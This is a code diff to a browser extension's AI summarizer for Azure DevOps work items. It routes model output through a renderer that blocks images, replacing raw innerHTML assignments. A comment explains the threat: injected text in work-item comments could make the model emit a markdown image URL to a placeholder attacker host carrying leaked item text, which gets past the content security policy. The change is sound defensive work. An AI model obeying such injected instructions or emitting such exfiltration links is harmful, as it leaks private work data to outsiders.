@@ -8,6 +8,17 @@
   let backdropEl = null;
   let hoverPopover = null;
 
+  // Model output is UNTRUSTED. Work-item comments are written by other people in the ADO
+  // org and go into the prompt verbatim, so a comment can carry a prompt injection that
+  // makes the model emit `![](https://attacker/?d=<leaked text>)`. The manifest CSP sets
+  // no img-src, so the browser would fetch that URL and exfiltrate the item — a channel
+  // that bypasses the strict connect-src entirely. A summary never needs images.
+  function renderAiMarkdown(el, md) {
+    const lib = window.AdoLib;
+    if (lib && lib.mdToHtml) el.innerHTML = lib.mdToHtml(md, { allowImages: false });
+    else el.textContent = md; // no renderer: show as text, never as HTML
+  }
+
   function createModal() {
     if (modalEl) return;
 
@@ -81,8 +92,7 @@
 
     createHoverPopover();
 
-    const mdToHtml = (window.AdoLib && window.AdoLib.mdToHtml) ? window.AdoLib.mdToHtml : (s => s);
-    hoverPopover.innerHTML = mdToHtml(summaryCache[wid]);
+    renderAiMarkdown(hoverPopover, summaryCache[wid]);
 
     const summarizeBtn = document.getElementById('s_ai_summarize');
     if (summarizeBtn) {
@@ -148,8 +158,7 @@
       if (!force && summaryCache[wid]) {
         document.getElementById('ai-summary-title').textContent = L('ai.summary.titleFor', 'AI Summary for #{id}', { id: wid });
         const contentEl = document.getElementById('ai-summary-modal-content');
-        const mdToHtml = (window.AdoLib && window.AdoLib.mdToHtml) ? window.AdoLib.mdToHtml : (s => s);
-        contentEl.innerHTML = mdToHtml(summaryCache[wid]);
+        renderAiMarkdown(contentEl, summaryCache[wid]);
 
         backdropEl.style.display = 'flex';
         if (window.LayerManager) {
@@ -252,9 +261,8 @@ ${commentsText ? `Discussion History:\n${commentsText}\n` : ''}`;
         const res = await ai.prompt(systemPrompt, userMessage);
         
         summaryCache[wid] = res;
-        
-        const mdToHtml = (window.AdoLib && window.AdoLib.mdToHtml) ? window.AdoLib.mdToHtml : (s => s);
-        contentEl.innerHTML = mdToHtml(res);
+
+        renderAiMarkdown(contentEl, res);
       } catch (err) {
         console.error('AISummarizer failed:', err);
         contentEl.innerHTML = `
